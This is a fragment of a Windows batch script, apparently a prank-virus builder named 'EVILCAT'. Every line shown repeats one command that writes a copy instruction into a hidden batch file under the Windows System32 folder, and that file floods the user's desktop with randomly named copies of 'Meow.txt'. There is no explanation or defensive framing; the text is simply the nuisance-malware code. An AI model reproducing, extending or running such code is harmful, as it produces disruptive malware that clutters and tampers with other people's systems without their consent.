echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
